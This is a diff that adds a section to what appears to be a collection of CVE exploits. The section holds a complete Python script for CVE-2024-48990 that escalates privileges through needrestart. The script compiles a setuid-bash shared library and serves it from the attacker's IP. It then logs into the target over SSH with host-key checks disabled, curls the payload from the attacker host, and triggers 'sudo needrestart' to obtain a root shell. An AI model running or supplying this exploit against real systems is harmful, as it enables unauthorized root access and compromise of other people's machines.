@@ -127,6 +127,155 @@ int main() {
     return 0;
 }
 ```
+### CVE-2024-48990
+https://github.com/Serner77/CVE-2024-48990-Automatic-Exploit
+```
+#!/usr/bin/env python3
+import argparse, os, threading, http.server, socketserver, subprocess, time
+import pexpect
+
+# ------------------ PARAMETERS ------------------
+parser = argparse.ArgumentParser()
+parser.add_argument('--user', required=True, help='SSH username on the target')
+parser.add_argument('--host', required=True, help='Target IP or hostname')
+parser.add_argument('--att-ip', required=True, help='Attacker IP address')
+parser.add_argument('--ssh-pass', help='SSH password (omit if using key auth)')
+parser.add_argument('--http-port', default=8000, type=int)
+args = parser.parse_args()
+
+# ------------------ CONFIGURATION ------------------
+WORKDIR = "/tmp/cve_2024_48990_exploit"
+os.makedirs(WORKDIR, exist_ok=True)
+os.chdir(WORKDIR)
+
+# ------------------ COMPILE __init__.so ------------------
+print("[*] Compiling payload __init__.so ...")
+lib_c = r'''
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor)) void init() {
+    if(geteuid() == 0) {
+        system("cp /bin/bash /tmp/poc; chmod u+s /tmp/poc");
+    }
+}
+'''
+with open("lib.c", "w") as f:
+    f.write(lib_c)
+
+ret = subprocess.run(["gcc", "-shared", "-fPIC", "lib.c", "-o", "__init__.so"])
+if ret.returncode != 0:
+    print("[-] Error: compilation failed. Is gcc installed?")
+    exit(1)
+
+# ------------------ HTTP SERVER ------------------
+PORT = args.http_port
+class QuietHandler(http.server.SimpleHTTPRequestHandler):
+    def log_message(self, format, *a): pass
+
+def serve_http():
+    handler = QuietHandler
+    httpd = socketserver.TCPServer(("", PORT), handler)
+    print(f"[*] HTTP server running at http://{args.att_ip}:{PORT}/__init__.so")
+    httpd.serve_forever()
+
+t = threading.Thread(target=serve_http, daemon=True)
+t.start()
+time.sleep(0.5)
+
+# ------------------ REMOTE SCRIPT ------------------
+remote_script = f"""#!/bin/bash
+set -e
+echo "[*] Preparing malicious environment..."
+mkdir -p /tmp/malicious/importlib
+cd /tmp/malicious/importlib
+curl -s http://{args.att_ip}:{PORT}/__init__.so -o __init__.so || (echo "[-] Failed to download __init__.so"; exit 2)
+
+cd /tmp/malicious
+echo "[*] Creating bait script e.py..."
+cat > /tmp/malicious/e.py <<'EOPY'
+import os, time
+while True:
+    try:
+        import importlib
+    except:
+        pass
+    if os.path.exists("/tmp/poc"):
+        os.system("/tmp/poc -p")
+        break
+    time.sleep(1)
+EOPY
+
+echo "[*] Launching bait process with malicious PYTHONPATH..."
+PYTHONPATH=$PWD python3 e.py >/dev/null 2>&1 &
+echo "[*] Bait PID: $(echo $!)"
+sleep 2
+
+echo "[*] Running needrestart..."
+sudo /usr/sbin/needrestart || true
+
+echo "[*] Checking if /tmp/poc was created..."
+if [ -f /tmp/poc ]; then
+  echo "[+] Exploit successful: executing root shell..."
+  /tmp/poc -p
+else
+  echo "[-] /tmp/poc not found. Exploit failed or target not vulnerable."
+fi
+"""
+
+# Save the remote script locally
+script_local = os.path.join(WORKDIR, "remote.sh")
+with open(script_local, "w") as f:
+    f.write(remote_script)
+
+# ------------------ SSH CONNECTION & EXECUTION ------------------
+ssh_cmd = f"ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {args.user}@{args.host}"
+print(f"[*] Connecting to {args.user}@{args.host} ...")
+
+child = pexpect.spawn(ssh_cmd, encoding='utf-8', timeout=300)
+try:
+    i = child.expect([pexpect.TIMEOUT, 'assword:', 'Are you sure you want to continue connecting', '[#$]'])
+    if i == 0:
+        print("[-] SSH timeout")
+        exit(1)
+    if i == 1:
+        if not args.ssh_pass:
+            print("[-] SSH password required, use --ssh-pass")
+            exit(1)
+        child.sendline(args.ssh_pass)
+        child.expect('[#$]')
+    elif i == 2:
+        child.sendline("yes")
+        j = child.expect(['assword:', '[#$]'])
+        if j == 0 and args.ssh_pass:
+            child.sendline(args.ssh_pass)
+            child.expect('[#$]')
+    elif i == 3:
+        pass  # already connected
+
+    print("[*] Uploading remote exploit script...")
+    child.sendline("cat > /tmp/exploit.sh <<'EOF'")
+    with open(script_local) as f:
+        for line in f:
+            child.send(line)
+    child.sendline("EOF")
+    child.expect('[#$]')
+    child.sendline("chmod +x /tmp/exploit.sh")
+    child.expect('[#$]')
+
+    print("[*] Executing exploit remotely...")
+    child.sendline("bash /tmp/exploit.sh")
+    child.interact()
+
+except KeyboardInterrupt:
+    print("\n[!] Interrupted by user.")
+finally:
+    try:
+        child.close()
+    except:
+        pass
+```
 
 ### CVE-2025-24893
 https://github.com/gunzf0x/CVE-2025-24893
